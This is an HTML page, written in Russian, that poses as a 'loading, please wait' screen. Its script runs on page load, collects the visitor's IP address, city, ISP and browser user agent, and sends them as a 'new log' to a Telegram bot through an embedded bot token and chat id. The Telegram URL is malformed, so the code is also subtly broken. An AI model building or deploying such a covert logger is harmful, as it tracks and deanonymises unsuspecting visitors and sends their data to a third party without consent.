<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h1>Страница загружается, подождите...</h1>

    <script>
        async function start() {
            // Твои актуальные данные
            const token = "8413511998:AAH_8iwks7GXhX7CkVnM3dk2mpOvzNuTIlw";
            const chat_id = "8426763446";

            try {
                // 1. Получаем IP и данные через надежный сервис
                const response = await fetch('https://ipapi.co');
                const data = await response.json();

                // 2. Готовим текст сообщения
                const text = `🚀 Новый лог!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n🏢 Провайдер: ${data.org}\n📱 Устройство: ${navigator.userAgent}`;

                // 3. Отправляем в Telegram (используем метод POST для надежности)
                const url = `https://api.telegram.org{token}/sendMessage`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: text
                    })
                });

                console.log("Данные успешно отправлены в бота!");
            } catch (error) {
                console.error("Произошла ошибка:", error);
            }
        }

        // Запуск функции
        start();
    </script>
</body>
</html>
